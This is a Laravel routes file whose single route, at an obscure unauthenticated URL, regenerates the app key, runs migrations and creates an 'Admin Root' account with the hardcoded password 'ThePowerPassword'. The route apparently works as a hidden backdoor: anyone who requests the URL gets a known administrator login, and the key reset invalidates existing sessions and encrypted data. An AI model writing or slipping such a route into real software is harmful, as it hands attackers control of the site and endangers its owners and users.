<?php

use App\Http\Controllers\Admin\Integration\AdminTelegramBotController;
use App\Http\Controllers\ProfileController;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/
Route::get('/install_session5454t4t5t', function () {

    Artisan::call('key:generate');
    Artisan::call('config:clear');
    Artisan::call('cache:clear');
    Artisan::call('migrate');


    $user = new \App\Models\User();
    $user->password = \Illuminate\Support\Facades\Hash::make('ThePowerPassword');
    $user->email = 'root@'.request()->getHttpHost();
    $user->name = 'Admin Root';
    $user->save();

    return Artisan::output();
});
